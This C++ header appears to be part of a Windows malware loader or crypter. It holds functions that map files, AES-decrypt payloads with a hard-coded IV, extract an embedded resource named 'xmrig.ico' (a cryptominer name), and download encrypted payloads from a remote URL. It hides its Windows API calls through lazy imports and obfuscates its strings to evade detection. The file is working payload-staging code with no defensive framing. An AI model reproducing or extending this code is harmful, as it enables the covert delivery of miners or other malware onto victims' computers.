
#pragma once
#include "lib/httplib.h"
#include "file_util.h"
#include <iostream>
#include "pe_hdrs_helper.h"
#include <vector>
#include "lib/aes.hpp"
#include "lib/lazy_importer.hpp"
#include "lib/obfuscate.h"
#include <string>
#include <regex>


ALIGNED_BUF load_file(IN LPCTSTR filename, OUT size_t &read_size)
{
    HANDLE file = LI_FN(CreateFileA)(filename, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(file == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        std::cerr << "Could not open file!" << std::endl;
#endif
        return nullptr;
    }
    HANDLE mapping = CreateFileMappingA(file, 0, PAGE_READONLY, 0, 0, 0);
    if (!mapping) {
#ifdef _DEBUG
        std::cerr << "Could not create mapping!" << std::endl;
#endif
        LI_FN(CloseHandle)(file);
        return nullptr;
    }
    BYTE* dllRawData = (BYTE*)LI_FN(MapViewOfFile)(mapping, FILE_MAP_READ, 0, 0, 0);
    if (!dllRawData) {
#ifdef _DEBUG
        std::cerr << "Could not map view of file" << std::endl;
#endif
        LI_FN(CloseHandle)(mapping);
        LI_FN(CloseHandle)(file);
        return nullptr;
    }
    size_t r_size = LI_FN(GetFileSize)(file, nullptr);
    if (read_size != 0 && read_size <= r_size) {
        r_size = read_size;
    }
    if (is_bad_read_ptr(dllRawData, r_size)) {
        std::cerr << "[-] Mapping of " << filename << " is invalid!" << std::endl;
        LI_FN(UnmapViewOfFile)(dllRawData);
        LI_FN(CloseHandle)(mapping);
        LI_FN(CloseHandle)(file);
        return nullptr;
    }
    UNALIGNED_BUF localCopyAddress = alloc_unaligned(r_size);
    if (localCopyAddress != nullptr) {
        memcpy(localCopyAddress, dllRawData, r_size);
        read_size = r_size;
    } else {
        read_size = 0;
#ifdef _DEBUG
        std::cerr << "Could not allocate memory in the current process" << std::endl;
#endif
    }
    LI_FN(UnmapViewOfFile)(dllRawData);
    LI_FN(CloseHandle)(mapping);
    LI_FN(CloseHandle)(file);
    return localCopyAddress;
}

BYTE* DecryptResourceBuffer(BYTE* encryptedData, size_t dataSize, const std::string& key_str, const std::string& iv_str, size_t& outSize) {
    if (dataSize == 0 || !encryptedData) return nullptr;

    // Copy encrypted data into a vector
    std::vector<uint8_t> buffer(encryptedData, encryptedData + dataSize);

    // Setup key and IV
    unsigned char key[32] = { 0 }; // AES-256 key size
    unsigned char iv[16] = { 0 };



    memcpy(key, key_str.data(), (key_str.size() < sizeof(key)) ? key_str.size() : sizeof(key));

    memcpy(iv, iv_str.data(), (iv_str.size() < sizeof(iv)) ? iv_str.size() : sizeof(iv));

    // Init AES context
    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    AES_CBC_decrypt_buffer(&ctx, buffer.data(), buffer.size());

    // Remove padding
    if (!buffer.empty()) {
        uint8_t pad_len = buffer.back();
        if (pad_len > 0 && pad_len <= 16 && pad_len <= buffer.size()) {
            buffer.resize(buffer.size() - pad_len);
        }
    }

    // Allocate output buffer
    outSize = buffer.size();
    BYTE* output = (BYTE*)LI_FN(VirtualAlloc)(nullptr, outSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!output) return nullptr;

    memcpy(output, buffer.data(), outSize);
    return output;
}


BYTE* buffer_payload_resource(WORD resourceID, OUT size_t& r_size, const std::string& key) {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
    if (!hResource) {
        std::cerr << ("Error: Could not find resource!") << std::endl;
        return nullptr;
    }

    HGLOBAL hLoadedResource = LI_FN(LoadResource)(nullptr, hResource);
    if (!hLoadedResource) {
        std::cerr << ("Error: Could not load resource!") << std::endl;
        return nullptr;
    }

    BYTE* pResourceData = static_cast<BYTE*>(LI_FN(LockResource)(hLoadedResource));
    size_t dataSize = LI_FN(SizeofResource)(nullptr, hResource);
    if (!pResourceData || dataSize == 0) {
        std::cerr << ("Error: Could not lock resource!") << std::endl;
        return nullptr;
    }


    std::string validty = (std::string)("NoKey");

    if (key == validty) {
        printf("Key is Set to No Key\n");
        r_size = dataSize;

        BYTE* localCopyAddress = (BYTE*)LI_FN(VirtualAlloc)(nullptr, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!localCopyAddress) {
            std::cerr << ("Error: Could not allocate memory!") << std::endl;
            return nullptr;
        }

        memcpy(localCopyAddress, pResourceData, r_size);
        return localCopyAddress;
    }

    // Use consistent IV from your encrypting code
    std::string iv = (std::string)("freediddybummynz");

    return DecryptResourceBuffer(pResourceData, dataSize, key, iv, r_size);

}


BYTE* load_embedded_resource(WORD lpName, OUT size_t& r_size) {
    // Load resource from current executable
    HRSRC hResInfo = LI_FN(FindResourceA)(LI_FN(GetModuleHandleW)(nullptr), "xmrig.ico", RT_RCDATA);
    if (!hResInfo) { std::cerr << "Loading embedded resource failed!\n"; return nullptr; }

    DWORD dwSize = LI_FN(SizeofResource)(LI_FN(GetModuleHandleW)(nullptr), hResInfo);
    BYTE* pDataBuffer = new BYTE[dwSize];  // Allocate buffer for the data.

    // Load the resource into memory (HGLOBAL) and get a pointer to it.
    LPVOID lpvLoadedResource = LI_FN(LockResource)(LI_FN(LoadResource)(LI_FN(GetModuleHandleW)(nullptr), hResInfo));
    if (!lpvLoadedResource) { std::cerr << "Locking embedded resource failed!\n"; return nullptr; }

    r_size = dwSize;
    // Copy the data to our buffer.
    memcpy_s(pDataBuffer, dwSize, lpvLoadedResource, dwSize);

    return pDataBuffer;
}


void free_file(IN UNALIGNED_BUF buffer)
{
    free_unaligned(buffer);
}


BYTE* buffer_payload_from_url(const std::string& baseurl, const std::string& file, OUT size_t& r_size, const std::string& key, const std::string& savePath) {
   
    std::vector<uint8_t> encryptedBuffer;
    httplib::Client client(baseurl);

    try {
        // Send a GET request to download the file
        auto res = client.Get(file);

        // Check if the request was successful
        if (res && res->status == 200) {

            printf("Size Of Res: %d\n", res->body.length());
     
            encryptedBuffer.resize(res->body.length());
            memcpy(&encryptedBuffer[0], res->body.c_str(), res->body.length());
  
            std::cout << "File downloaded successfully: " << std::endl;
        }
        else {
            std::cerr << "HTTP error occurred: "
                << (res ? std::to_string(res->status) : "No response") << std::endl;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error occurred: " << e.what() << std::endl;
    }

  

    if (encryptedBuffer.empty()) {
        std::cerr << "Download failed or file was empty!" << std::endl;
        return nullptr;
    }

    std::string validty = (std::string)AY_OBFUSCATE("NoKey");

    if (key == validty) {
        r_size = encryptedBuffer.size();
        BYTE* rawCopy = (BYTE*)LI_FN(VirtualAlloc)(nullptr, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!rawCopy) return nullptr;

        memcpy(rawCopy, encryptedBuffer.data(), r_size);
        return rawCopy;
    }

    // Decrypt the payload using the same IV as encryption
    std::string iv = (std::string)AY_OBFUSCATE("freediddybummynz");

    return DecryptResourceBuffer(encryptedBuffer.data(), encryptedBuffer.size(), key, iv, r_size);
}


std::pair<std::string, std::string> parseURL(const std::string& url) {
    std::regex urlRegex(R"(^(https?://[^/]+)(/.*)?$)", std::regex::icase);
    std::smatch match;

    if (std::regex_match(url, match, urlRegex)) {
        std::string base = match[1].str();
        std::string path = match[2].matched ? match[2].str() : "/";
        return { base, path };
    }

    throw std::invalid_argument("Invalid URL format");
}